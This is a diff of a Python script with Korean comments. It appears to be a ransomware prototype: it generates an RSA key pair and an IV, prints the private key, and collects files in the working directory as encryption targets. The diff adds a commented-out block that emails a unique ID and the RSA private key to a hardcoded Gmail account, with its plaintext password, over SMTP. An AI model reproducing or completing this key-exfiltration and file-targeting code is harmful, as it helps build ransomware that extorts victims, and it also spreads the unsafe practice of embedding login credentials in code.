@@ -12,6 +12,7 @@ import binascii
 #나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
 import smtplib
 import uuid
+from email.mime.text import MIMEText
 
 iv = os.urandom(16)
 
@@ -204,6 +205,23 @@ if __name__ == "__main__":
     private_key = rsa_key.export_key()
     print("비밀키는 : ", private_key)
 
+    '''
+    #고유 식별자 번호
+    UUID = uuid.uuid4()
+
+    #smtp 로그인 후 비밀키 전송
+    smtp = smtplib.SMTP('smtp.gmail.com', 587)
+    smtp.ehlo()  # say Hello
+    smtp.starttls()  # TLS 사용시 필요
+    smtp.login('secureantdd@gmail.com', 'antdd1234')    #확인은 이 계정에서!
+
+    msg = MIMEText(str(UUID) + '/' + private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
+    msg['Subject'] = '테스트'
+    msg['To'] = 'secureantdd@gmail.com'
+    smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
+
+    smtp.quit()
+    '''
 
     #timer 테스트
     enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
